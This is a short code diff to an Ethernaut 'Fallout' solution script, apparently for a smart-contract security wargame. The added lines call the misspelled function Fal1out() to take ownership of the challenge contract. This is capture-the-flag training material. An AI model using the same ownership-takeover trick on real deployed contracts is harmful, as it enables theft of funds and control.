@@ -19,7 +19,8 @@ contract FalloutSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
+        Fallout fallout = Fallout(challengeInstance);
+        fallout.Fal1out();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
